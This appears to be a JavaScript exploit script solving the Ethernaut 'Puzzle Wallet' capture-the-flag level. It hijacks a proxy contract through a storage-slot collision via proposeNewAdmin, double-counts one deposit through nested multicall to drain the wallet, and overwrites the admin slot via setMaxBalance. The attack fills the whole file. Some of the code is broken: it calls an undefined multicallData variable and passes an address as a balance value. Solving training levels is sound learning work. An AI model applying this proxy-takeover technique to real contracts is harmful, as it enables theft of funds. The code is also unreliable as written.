/**
 * Have to understand about delegatecall
 */

//STEP 1: Chande owner to player through proxy contract
const selectorFunc = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}
const data = await web3.eth.abi.encodeFunctionCall(selectorFunc, [player])
await web3.eth.sendTransaction({from: player, to: instance, data})

//STEP 2: Add yourself to whitelist
await contract.addToWhitelist(player)

//STEP 3: Manipulate PuzzleWallet balance to 0
// get deposit() selector function
const depositSelector = await contract.methods["deposit()"].request().then(v => v.data)
// multicall function with params: deposit()
const multicallSelectorData = await contract.methods["multicall(bytes[])"].request([depositSelector]).then(v => v.data)

await contract.multicall([multicallData, multicallData], {value: toWei('0.001')}) 
/**
 * PuzzleWallet Balance -> 0.002 ether
 * Player Balance -> 0.002 ether
 */
await contract.execute(player, toWei('0.002'), 0x0)

//STEP 4: Set Max balance to player of claim ownership of proxy
await contract.setMaxBalance(player)

